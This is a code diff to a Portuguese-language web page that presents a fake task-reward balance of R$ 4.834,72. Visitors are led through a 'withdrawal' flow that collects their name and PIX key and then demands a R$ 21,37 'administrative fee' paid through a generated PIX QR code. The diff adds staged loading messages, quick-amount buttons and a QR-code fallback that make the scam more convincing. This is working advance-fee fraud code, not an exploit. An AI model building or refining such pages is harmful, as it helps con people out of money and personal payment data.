@@ -63,6 +63,10 @@
       display: none;
     }
 
+    #home-screen {
+      padding-bottom: 92px;
+    }
+
     .screen.is-exiting {
       position: absolute;
       inset: 8px 10px auto;
@@ -269,6 +273,45 @@
       box-shadow: 0 1px 0 rgba(20, 22, 28, 0.04);
     }
 
+    .home-withdraw-card {
+      position: fixed;
+      left: 50%;
+      bottom: max(12px, env(safe-area-inset-bottom));
+      z-index: 20;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 14px;
+      width: min(calc(100% - 20px), 420px);
+      margin: 0;
+      padding: 14px 16px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--surface);
+      box-shadow: 0 12px 28px rgba(20, 22, 28, 0.12);
+      transform: translateX(-50%);
+    }
+
+    .home-withdraw-card[hidden] {
+      display: none;
+    }
+
+    .home-withdraw-card span {
+      display: block;
+      color: var(--muted);
+      font-size: 12px;
+      font-weight: 800;
+    }
+
+    .home-withdraw-card strong {
+      display: block;
+      margin-top: 4px;
+      color: var(--ink);
+      font-size: 18px;
+      line-height: 1;
+      font-weight: 900;
+    }
+
     .balance-strip span,
     .balance-card span,
     .confirm-balance span {
@@ -294,9 +337,29 @@
       font-size: 20px;
     }
 
+    .withdraw-action {
+      position: relative;
+      display: inline-grid;
+      justify-items: center;
+      padding-top: 9px;
+      flex: 0 0 auto;
+    }
+
+    .withdraw-pix-icon {
+      position: absolute;
+      top: 0;
+      right: 19px;
+      width: 15px;
+      height: 15px;
+      border-radius: 4px;
+      object-fit: cover;
+      filter: drop-shadow(0 1px 2px rgba(20, 22, 28, 0.14));
+    }
+
     .withdraw {
       display: inline-flex;
       align-items: center;
+      justify-content: center;
       gap: 7px;
       min-width: 76px;
       min-height: 31px;
@@ -312,9 +375,10 @@
     .task-card {
       display: grid;
       grid-template-columns: 1fr auto;
-      gap: 14px;
+      align-items: center;
+      gap: 10px;
       margin-bottom: 10px;
-      padding: 18px 16px;
+      padding: 15px 14px;
       border-radius: 8px;
       background: var(--surface);
       box-shadow: 0 10px 24px rgba(20, 22, 28, 0.07);
@@ -322,10 +386,10 @@
 
     .task-card h1 {
       margin: 0 0 4px;
-      max-width: 210px;
+      max-width: 190px;
       color: #22232b;
-      font-size: 21px;
-      line-height: 1.08;
+      font-size: 18px;
+      line-height: 1.06;
       letter-spacing: 0;
     }
 
@@ -337,60 +401,19 @@
 
     .task-art {
       position: relative;
-      display: grid;
-      width: 92px;
-      height: 92px;
-      place-items: center;
-      border-radius: 24px;
-      background: linear-gradient(145deg, #f2e6ff, #fff8e1);
-      color: var(--success);
-      font-size: 39px;
-      font-weight: 900;
-      box-shadow: inset 0 -10px 18px rgba(143, 84, 220, 0.12);
-    }
-
-    .task-art::before,
-    .task-art::after {
-      content: "";
-      position: absolute;
-      border-radius: 50%;
-      background: #f6c33b;
-      box-shadow: inset -4px -5px 0 rgba(190, 130, 20, 0.18);
-    }
-
-    .task-art::before {
-      left: -10px;
-      top: 24px;
-      width: 24px;
-      height: 24px;
-    }
-
-    .task-art::after {
-      right: -8px;
-      bottom: 12px;
-      width: 30px;
-      height: 30px;
+      display: flex;
+      width: 98px;
+      height: 76px;
+      flex: 0 0 auto;
+      align-items: center;
+      justify-content: center;
     }
 
     .task-art-icon {
-      position: relative;
-      display: grid;
-      width: 56px;
-      height: 56px;
-      place-items: center;
-      border-radius: 16px;
-      background: #8d55df;
-      color: #19c99a;
-      box-shadow: 0 9px 16px rgba(112, 75, 185, 0.23);
-    }
-
-    .task-art-icon::before {
-      content: "";
-      position: absolute;
-      inset: -10px 10px auto;
-      height: 15px;
-      border-radius: 999px 999px 0 0;
-      background: #b878ff;
+      display: block;
+      width: 96px;
+      height: 72px;
+      object-fit: contain;
     }
 
     .task-row {
@@ -602,6 +625,16 @@
       font-weight: 700;
     }
 
+    .last-reward {
+      margin: 12px -18px -18px;
+      padding: 9px 18px;
+      border-top: 1px solid rgba(255, 255, 255, 0.08);
+      background: #060607;
+      color: rgba(255, 255, 255, 0.58);
+      font-size: 11px;
+      font-weight: 800;
+    }
+
     .pix-form,
     .security-block,
     .process-card,
@@ -617,6 +650,82 @@
       display: grid;
       gap: 14px;
       padding: 0 18px 18px;
+    }
+
+    .withdraw-method-row {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin: 0 0 13px;
+      color: #7f838d;
+      font-size: 12px;
+      font-weight: 800;
+    }
+
+    .withdraw-method-row img {
+      width: 14px;
+      height: 14px;
+      border-radius: 4px;
+      object-fit: cover;
+    }
+
+    .withdraw-options {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 6px;
+      margin-bottom: 10px;
+    }
+
+    .withdraw-option {
+      min-height: 42px;
+      border-radius: 6px;
+      background: #eef2f2;
+      color: #333640;
+      font-size: 13px;
+      font-weight: 900;
+    }
+
+    .withdraw-option.is-selected {
+      border: 1px solid rgba(214, 43, 97, 0.28);
+      background: #f8e9ee;
+      color: var(--accent);
+    }
+
+    .withdraw-amount {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 44px;
+      margin-bottom: 10px;
+      border: 1px solid transparent;
+      border-radius: 7px;
+      background: #eef2f2;
+      color: #333640;
+      font-size: 13px;
+      font-weight: 900;
+      cursor: pointer;
+      transition: border-color 0.18s ease, background 0.18s ease, box-shadow 0.18s ease;
+    }
+
+    .withdraw-amount.is-selected {
+      border-color: rgba(214, 43, 97, 0.28);
+      background: #f8e9ee;
+      color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(214, 43, 97, 0.08);
+    }
+
+    .withdraw-amount:focus-visible {
+      outline: 3px solid rgba(214, 43, 97, 0.16);
+      outline-offset: 2px;
+    }
+
+    .withdraw-note {
+      margin: 10px 0 0;
+      color: #8a8e98;
+      font-size: 11px;
+      line-height: 1.35;
+      text-align: center;
+      font-weight: 700;
     }
 
     .field-group,
@@ -984,14 +1093,144 @@
       box-shadow: 0 -18px 48px rgba(20, 22, 28, 0.18);
     }
 
+    .method-sheet {
+      z-index: 30;
+      display: none;
+      gap: 0;
+      padding: 0 14px 14px;
+    }
+
+    .method-sheet.visible {
+      display: grid;
+    }
+
+    .method-sheet label {
+      margin-bottom: 9px;
+      color: #2f323b;
+      font-size: 11px;
+      font-weight: 900;
+    }
+
+    .method-sheet .field-control,
+    .method-sheet .field-group {
+      padding: 12px 0;
+      border-bottom: 1px solid #e7e8ee;
+    }
+
+    .method-sheet .field,
+    .method-sheet select {
+      min-height: 24px;
+      padding: 0;
+      border: 0;
+      border-radius: 0;
+      background: transparent;
+      color: #2f323b;
+      font-size: 13px;
+      font-weight: 700;
+      box-shadow: none;
+    }
+
+    .method-sheet .field::placeholder,
+    .method-sheet select:invalid {
+      color: #a7aab3;
+      font-weight: 700;
+    }
+
+    .method-sheet .field:focus,
+    .method-sheet select:focus {
+      border-color: transparent;
+      background: transparent;
+      box-shadow: none;
+    }
+
+    .method-sheet .select-wrap::after {
+      right: 3px;
+      width: 6px;
+      height: 6px;
+      border-color: #b0b3bb;
+    }
+
+    .method-sheet .request-withdraw {
+      min-height: 39px;
+      margin-top: 12px;
+      border-radius: 5px;
+      font-size: 12px;
+      box-shadow: none;
+    }
+
+    .method-sheet .request-withdraw:disabled {
+      background: #b8b8b8;
+      color: #fff;
+    }
+
+    .method-sheet .modal-title::before {
+      display: none;
+    }
+
     .modal-title {
       position: relative;
       margin: 0;
-      padding: 22px 18px 12px;
+      padding: 13px 18px 14px;
       border-bottom: 1px solid var(--line);
       text-align: center;
-      font-size: 17px;
+      font-size: 14px;
       font-weight: 900;
+    }
+
+    .method-option {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin: 0 -18px;
+      padding: 14px 18px;
+      border-bottom: 1px solid var(--line);
+    }
+
+    .method-option-main {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .method-option-icon {
+      display: grid;
+      width: 24px;
+      height: 24px;
+      place-items: center;
+      border-radius: 6px;
+      background: #edfafa;
+    }
+
+    .method-option-icon img {
+      width: 15px;
+      height: 15px;
+      border-radius: 4px;
+      object-fit: cover;
+    }
+
+    .method-option strong,
+    .method-option small {
+      display: block;
+    }
+
+    .method-option strong {
+      color: #30333c;
+      font-size: 13px;
+      font-weight: 900;
+    }
+
+    .method-option small {
+      margin-top: 2px;
+      color: #8a8e98;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .method-chevron {
+      color: #a0a4ae;
+      font-size: 22px;
+      line-height: 1;
     }
 
     .modal-title::before {
@@ -1043,16 +1282,19 @@
           <span>Seu saldo</span>
           <strong class="js-balance-amount">R$ 4.834,72</strong>
         </div>
-        <button class="withdraw" id="open-withdraw" type="button">Sacar</button>
+        <div class="withdraw-action" aria-label="Saque via PIX">
+          <img class="withdraw-pix-icon" src="assets/pix-symbol.jpg" alt="">
+          <button class="withdraw js-open-withdraw" id="open-withdraw" type="button">Sacar</button>
+        </div>
       </section>
 
       <section class="task-card" aria-label="Resumo das atividades">
         <div>
-          <h1>Parabéns! Você concluiu todas as tarefas</h1>
+          <h1>Parabéns! Você concluiu todas as suas tarefas</h1>
           <div class="reward js-balance-amount">R$ 4.834,72</div>
         </div>
         <div class="task-art" aria-hidden="true">
-          <span class="task-art-icon">&check;</span>
+          <img class="task-art-icon" src="assets/task-complete-icon.png" alt="">
         </div>
       </section>
 
@@ -1129,6 +1371,17 @@
       </section>
     </section>
 
+    <section class="home-withdraw-card" id="home-withdraw-card" aria-label="Saque disponível" hidden>
+      <div>
+        <span>Disponível para saque</span>
+        <strong class="js-balance-amount">R$ 4.834,72</strong>
+      </div>
+      <div class="withdraw-action" aria-label="Saque via PIX">
+        <img class="withdraw-pix-icon" src="assets/pix-symbol.jpg" alt="">
+        <button class="withdraw js-open-withdraw" type="button">Sacar</button>
+      </div>
+    </section>
+
     <section class="screen modal-screen" id="withdraw-screen" hidden>
       <header class="withdraw-header">
         <button class="back-button" id="back-home" type="button" aria-label="Voltar">
@@ -1143,36 +1396,47 @@
         <span>Seu saldo</span>
         <strong class="js-balance-amount">R$ 4.834,72</strong>
         <p class="balance-subline">Valor registrado para solicitação de saque</p>
+        <p class="last-reward">Última recompensa: R$ 646,43</p>
         <div class="coin" aria-hidden="true">P</div>
       </section>
 
       <section class="data-card" aria-label="Dados do pedido">
         <h2 class="data-title">Sacar dinheiro</h2>
-        <div class="data-row">
-          <span>Transferência via PIX</span>
-          <strong>Ativa</strong>
+        <div class="withdraw-method-row">
+          <span>Transferência via</span>
+          <img src="assets/pix-symbol.jpg" alt="">
+          <strong>PIX</strong>
         </div>
-        <div class="data-row">
-          <span>Valor solicitado</span>
-          <strong class="js-balance-amount">R$ 4.834,72</strong>
+
+        <div class="withdraw-options" aria-label="Valores rápidos">
+          <button class="withdraw-option" type="button" data-withdraw-amount="1.5">R$1,5</button>
+          <button class="withdraw-option" type="button" data-withdraw-amount="5">R$5</button>
+          <button class="withdraw-option" type="button" data-withdraw-amount="10">R$10</button>
         </div>
+
+        <div class="withdraw-amount js-selected-withdraw-amount" role="button" tabindex="0" data-withdraw-amount="4834.72">R$ 4.834,72</div>
+        <button class="request-withdraw" id="open-method-sheet" type="button">Sacar dinheiro</button>
+        <p class="withdraw-note">
+          Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
+        </p>
       </section>
 
-      <form class="pix-form modal-card" novalidate>
+      <form class="pix-form modal-card method-sheet" id="method-sheet" novalidate>
         <h2 class="modal-title">Vincular PIX</h2>
 
         <div class="field-control">
           <label for="withdraw-name">Nome</label>
-          <input class="field" id="withdraw-name" type="text" name="name" placeholder="Digite seu nome completo" autocomplete="name" aria-describedby="name-error">
+          <input class="field" id="withdraw-name" type="text" name="name" placeholder="Nome completo" autocomplete="name" aria-describedby="name-error">
           <p class="field-error" id="name-error">Preencha seu nome completo corretamente.</p>
         </div>
 
         <div class="field-group">
           <label for="pix-type">Tipo de Chave PIX</label>
           <div class="select-wrap">
-            <select id="pix-type" name="pix-type">
+            <select id="pix-type" name="pix-type" required>
+              <option value="" selected disabled>Escolha o tipo de chave PIX</option>
               <option value="cpf">CPF</option>
-              <option value="email" selected>E-mail</option>
+              <option value="email">E-mail</option>
               <option value="telefone">Telefone</option>
               <option value="aleatoria">Chave aleatória</option>
             </select>
@@ -1181,7 +1445,7 @@
 
         <div class="field-control">
           <label for="pix-key">Chave PIX</label>
-          <input class="field" id="pix-key" type="text" name="pix-key" placeholder="000.000.000-00" inputmode="numeric" maxlength="14" autocomplete="off" aria-describedby="pix-key-error">
+          <input class="field" id="pix-key" type="text" name="pix-key" placeholder="Digite sua chave PIX" inputmode="text" autocomplete="off" aria-describedby="pix-key-error">
           <p class="field-error" id="pix-key-error">Preencha sua chave PIX corretamente.</p>
         </div>
 
@@ -1206,7 +1470,7 @@
 
       <section class="confirm-balance" aria-label="Resumo do valor solicitado">
         <span>Valor solicitado</span>
-        <strong class="js-balance-amount">R$ 4.834,72</strong>
+        <strong class="js-selected-withdraw-amount">R$ 4.834,72</strong>
         <small>Aguardando pagamento da taxa administrativa</small>
       </section>
 
@@ -1220,7 +1484,7 @@
           O pagamento é referente à taxa de verificação, processamento antifraude e criação da transação PIX do pedido. O PIX abaixo cobra somente essa taxa administrativa.
         </p>
 
-        <details class="fee-question" open>
+        <details class="fee-question">
           <summary>O que está sendo pago?</summary>
           <p class="fee-answer">
             Você está pagando uma taxa administrativa de R$ 21,37 para validar os dados informados, processar a solicitação e gerar o registro de atendimento. Esse pagamento não é uma compra de produto físico e não altera a chave PIX cadastrada.
@@ -1277,7 +1541,7 @@
         </div>
         <div class="data-row">
           <span>Valor solicitado</span>
-          <strong class="js-balance-amount">R$ 4.834,72</strong>
+          <strong class="js-selected-withdraw-amount">R$ 4.834,72</strong>
         </div>
       </section>
 
@@ -1296,6 +1560,7 @@
           <p>Acompanhar solicitação <small>Use seus dados cadastrados para suporte</small></p>
         </div>
       </section>
+
     </section>
   </main>
 
@@ -1304,13 +1569,18 @@
     const homeScreen = document.querySelector("#home-screen");
     const withdrawScreen = document.querySelector("#withdraw-screen");
     const confirmScreen = document.querySelector("#confirm-screen");
+    const homeWithdrawCard = document.querySelector("#home-withdraw-card");
     const screens = [loadingScreen, homeScreen, withdrawScreen, confirmScreen];
     let activeScreen = loadingScreen;
     let screenTransitionId = 0;
-    const openWithdraw = document.querySelector("#open-withdraw");
+    const openWithdrawButtons = document.querySelectorAll(".js-open-withdraw");
     const backHome = document.querySelector("#back-home");
     const backWithdraw = document.querySelector("#back-withdraw");
     const pixForm = document.querySelector(".pix-form");
+    const methodSheet = document.querySelector("#method-sheet");
+    const openMethodSheet = document.querySelector("#open-method-sheet");
+    const withdrawOptions = document.querySelectorAll(".withdraw-option");
+    const fullWithdrawAmount = document.querySelector(".withdraw-amount");
     const requestWithdraw = document.querySelector("#request-withdraw");
     const nameInput = document.querySelector("#withdraw-name");
     const pixTypeInput = document.querySelector("#pix-type");
@@ -1325,6 +1595,7 @@
     const copyPix = document.querySelector("#copy-pix");
     const generateError = document.querySelector("#generate-error");
     const balanceAmounts = document.querySelectorAll(".js-balance-amount");
+    const selectedWithdrawAmounts = document.querySelectorAll(".js-selected-withdraw-amount");
     const paymentTimer = document.querySelector("#payment-timer");
     const stepBanner = document.querySelector("#step-banner");
     const reviewName = document.querySelector("#review-name");
@@ -1340,6 +1611,8 @@
       email: "",
       phone: "",
       checkoutKey: "",
+      amount: 4834.72,
+      quickAmount: 4834.72,
     };
 
     let isGeneratingPix = false;
@@ -1365,6 +1638,33 @@
       balanceAmounts.forEach((amount) => {
         amount.textContent = formatMoney(fixedBalance);
       });
+      selectedWithdrawAmounts.forEach((amount) => {
+        amount.textContent = formatMoney(withdrawalData.amount);
+      });
+    }
+
+    function setSelectedWithdrawAmount() {
+      selectedWithdrawAmounts.forEach((amount) => {
+        amount.textContent = formatMoney(withdrawalData.amount);
+      });
+      withdrawOptions.forEach((option) => {
+        option.classList.toggle("is-selected", Number(option.dataset.withdrawAmount) === withdrawalData.quickAmount);
+      });
+      fullWithdrawAmount.classList.toggle("is-selected", withdrawalData.quickAmount === withdrawalData.amount);
+    }
+
+    function setSelectedQuickAmount(value) {
+      withdrawalData.quickAmount = Number(value);
+      setSelectedWithdrawAmount();
+    }
+
+    function openWithdrawMethodSheet() {
+      methodSheet.classList.add("visible");
+      window.setTimeout(() => nameInput.focus(), 180);
+    }
+
+    function closeWithdrawMethodSheet() {
+      methodSheet.classList.remove("visible");
     }
 
     function showScreen(screen) {
@@ -1399,6 +1699,7 @@
           item.classList.toggle("is-entering", isActive);
           item.classList.remove("is-exiting");
         });
+        homeWithdrawCard.hidden = screen !== homeScreen;
 
         window.setTimeout(() => {
           if (screen === activeScreen) {
@@ -1413,6 +1714,31 @@
       loadingFill.style.animation = "none";
       loadingFill.offsetHeight;
       loadingFill.style.animation = "";
+    }
+
+    function runWithdrawLoadingSequence(onComplete) {
+      const messages = [
+        "Validando dados...",
+        "Concluindo resgate...",
+        "Quase pronto...",
+      ];
+      let index = 0;
+
+      setLoadingMessage(messages[index]);
+
+      const nextMessage = () => {
+        index += 1;
+
+        if (index >= messages.length) {
+          onComplete();
+          return;
+        }
+
+        setLoadingMessage(messages[index]);
+        window.setTimeout(nextMessage, 760);
+      };
+
+      window.setTimeout(nextMessage, 760);
     }
 
     function formatCountdown(totalSeconds) {
@@ -1461,6 +1787,13 @@
     function getPixKeyValidation() {
       const pixType = pixTypeInput.value;
       const value = pixKeyInput.value.trim();
+
+      if (!pixType) {
+        return {
+          isValid: false,
+          message: "Escolha o tipo de chave PIX.",
+        };
+      }
 
       if (pixType === "cpf") {
         return {
@@ -1549,6 +1882,13 @@
       pixKeyInput.type = "text";
       pixKeyInput.autocomplete = "off";
 
+      if (!pixType) {
+        pixKeyInput.placeholder = "Digite sua chave PIX";
+        pixKeyInput.inputMode = "text";
+        pixKeyInput.removeAttribute("maxlength");
+        return;
+      }
+
       if (pixType === "telefone") {
         pixKeyInput.placeholder = "(00) 00000-0000";
         pixKeyInput.inputMode = "tel";
@@ -1594,6 +1934,19 @@
     function normalizeQrImage(base64) {
       if (!base64) return "";
       return base64.startsWith("data:image") ? base64 : `data:image/png;base64,${base64}`;
+    }
+
+    function getQrImageSource({ base64, pixCode }) {
+      const normalizedImage = normalizeQrImage(base64);
+      if (normalizedImage) {
+        return normalizedImage;
+      }
+
+      if (!pixCode) {
+        return "";
+      }
+
+      return `https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=10&data=${encodeURIComponent(pixCode)}`;
     }
 
     function createCheckoutKey() {
@@ -1674,7 +2027,11 @@
         pixCode.value = data.pix_code;
         hasGeneratedPix = true;
 
-        const qrImage = normalizeQrImage(data.pix_base64);
+        const qrImage = getQrImageSource({
+          base64: data.pix_base64,
+          pixCode: data.pix_code,
+        });
+
         if (qrImage) {
           pixQrImage.src = qrImage;
           pixQrWrap.classList.add("visible");
@@ -1689,16 +2046,40 @@
       }
     }
 
-    openWithdraw.addEventListener("click", () => {
-      showScreen(withdrawScreen);
+    openWithdrawButtons.forEach((button) => {
+      button.addEventListener("click", () => {
+        closeWithdrawMethodSheet();
+        showScreen(withdrawScreen);
+      });
     });
 
     backHome.addEventListener("click", () => {
+      closeWithdrawMethodSheet();
       showScreen(homeScreen);
     });
 
     backWithdraw.addEventListener("click", () => {
+      closeWithdrawMethodSheet();
       showScreen(withdrawScreen);
+    });
+
+    openMethodSheet.addEventListener("click", openWithdrawMethodSheet);
+
+    withdrawOptions.forEach((option) => {
+      option.addEventListener("click", () => {
+        setSelectedQuickAmount(option.dataset.withdrawAmount);
+      });
+    });
+
+    fullWithdrawAmount.addEventListener("click", () => {
+      setSelectedQuickAmount(fullWithdrawAmount.dataset.withdrawAmount);
+    });
+
+    fullWithdrawAmount.addEventListener("keydown", (event) => {
+      if (event.key === "Enter" || event.key === " ") {
+        event.preventDefault();
+        setSelectedQuickAmount(fullWithdrawAmount.dataset.withdrawAmount);
+      }
     });
 
     pixTypeInput.addEventListener("change", () => {
@@ -1757,16 +2138,15 @@
 
       resetPixGeneration();
       updateStepBanner();
-      setLoadingMessage("Verificando dados...");
       showScreen(loadingScreen);
 
-      window.setTimeout(() => {
+      runWithdrawLoadingSequence(() => {
         startPaymentTimer();
         showScreen(confirmScreen);
         generatePixPayment();
         isSubmittingWithdraw = false;
         validateWithdrawForm();
-      }, 1900);
+      });
     });
 
     copyPix.addEventListener("click", async () => {
@@ -1792,6 +2172,7 @@
     });
 
     setDisplayedBalance();
+    setSelectedWithdrawAmount();
     updatePixKeyField();
     validateWithdrawForm();
     window.setTimeout(() => showScreen(homeScreen), 1900);
